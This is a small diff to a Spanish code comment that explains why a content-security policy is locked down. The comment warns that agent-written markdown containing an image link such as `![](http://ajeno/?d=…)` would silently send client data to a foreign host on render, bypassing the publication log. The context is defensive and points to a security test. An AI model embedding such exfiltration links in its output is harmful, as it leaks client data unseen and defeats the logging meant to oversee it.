@@ -6,7 +6,7 @@
  * markdown que escribió un agente sobre material del cliente. Con la política en
  * `null` —como estuvo—, un `![](http://ajeno/?d=…)` dispara el GET al pintarse,
  * sin un clic y sin una línea en `publications.jsonl`. Nada falla, nada se ve, y
- * `ARCHITECTURE.md` § 7 promete que todo lo que sale queda anotado. El ataque y su
+ * La app promete que todo lo que sale queda anotado. El ataque y su
  * control negativo: `tests/security/window.mjs`.
  *
  * Y una política se afloja sola con el tiempo: alguien mete un `img-src *` para
